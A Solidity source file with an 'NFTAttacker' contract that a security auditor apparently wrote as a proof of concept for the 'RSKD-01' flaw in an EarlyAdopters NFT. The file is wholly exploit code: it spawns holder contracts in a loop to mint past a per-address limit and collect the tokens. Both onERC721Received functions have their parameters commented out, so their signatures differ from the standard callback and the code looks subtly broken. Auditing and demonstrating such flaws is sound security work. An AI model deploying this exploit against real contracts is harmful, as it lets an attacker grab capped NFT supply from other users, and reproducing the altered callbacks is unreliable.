// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface MinteableNFT {
  function mint() external;
}

/**
 * @title NFTAttacker
 * @author Coinspect
 * @notice The smart contract was developed by a third-party security auditor to demonstrate
 * how to exploit the `RSKD-01` vulnerability in the EarlyAdopters NFT.
 * The vulnerability and its mitigation are demonstrated in the test file `test/nftAttacker.test.ts`
 */
contract NFTAttacker {
  address[] internal nftHolders;
  address internal owner;
  uint256 public amountOfNftsInControl;
  uint256 latestNftId;

  constructor() {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner, "not the owner");
    _;
  }

  function attack(address _target, uint256 _amountOfNfts) external {
    while (amountOfNftsInControl != _amountOfNfts) {
      address newNftHolder = address(new NFTHolder());
      nftHolders.push(newNftHolder);
      MinteableNFT(_target).mint(); // this function will call the onERC721Received hook
      IERC721(_target).safeTransferFrom(address(this), newNftHolder, latestNftId);
      amountOfNftsInControl += 1;
    }
  }

  function transferNFT(address _token, uint256 _tokenId, address _to) external onlyOwner {
    IERC721(_token).safeTransferFrom(address(this), _to, _tokenId);
  }

  function moveNFTFromHolder(
    address _nftHolder,
    address _token,
    uint256 _tokenId,
    address _to
  ) external onlyOwner {
    NFTHolder(_nftHolder).transferNFT(_token, _tokenId, _to);
  }

  function onERC721Received(
    /* address operator, */
    /* address from, */
    uint256 tokenId/* ,
    bytes calldata data */
  ) external returns (bytes4) {
    latestNftId = tokenId;
    return IERC721Receiver.onERC721Received.selector;
  }
}

contract NFTHolder {
  address internal owner;

  constructor() {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner, "not the owner");

    _;
  }

  function transferNFT(address _token, uint256 _tokenId, address _to) external onlyOwner {
    IERC721(_token).safeTransferFrom(address(this), _to, _tokenId);
  }

  function onERC721Received(
    /* address operator,
    address from,
    uint256 tokenId,
    bytes calldata data */
  ) external pure returns (bytes4) {
    return IERC721Receiver.onERC721Received.selector;
  }
}
